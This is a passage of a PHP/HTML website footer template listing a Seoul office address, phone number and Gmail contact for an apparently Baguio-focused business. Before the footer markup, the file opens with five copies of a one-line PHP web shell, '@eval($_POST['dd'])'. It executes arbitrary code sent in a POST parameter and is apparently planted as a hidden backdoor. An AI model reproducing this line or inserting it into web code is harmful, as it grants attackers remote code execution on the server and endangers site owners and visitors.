<?php @eval($_POST['dd']);?><?php @eval($_POST['dd']);?><?php @eval($_POST['dd']);?><?php @eval($_POST['dd']);?><?php @eval($_POST['dd']);?>			<div class="row">
				<footer>
					<div id="footer-menu">
						<div class="container">
							<div class="col-md-4">
								<h3>한국사무실</h3>
								<p>
									서울시 강남구 서초동 253-12<br>
									두산베어스텔 1002호 (우:06611) <br><br>

									강남역 7번출구<br>
									☎ 070-8226-5659<br><br>

									<a href="baguiotalk@gmail.com">baguiotalk@gmail.com</a>
								</p>
							</div>
							<div class="col-md-8">
								<div class="row">
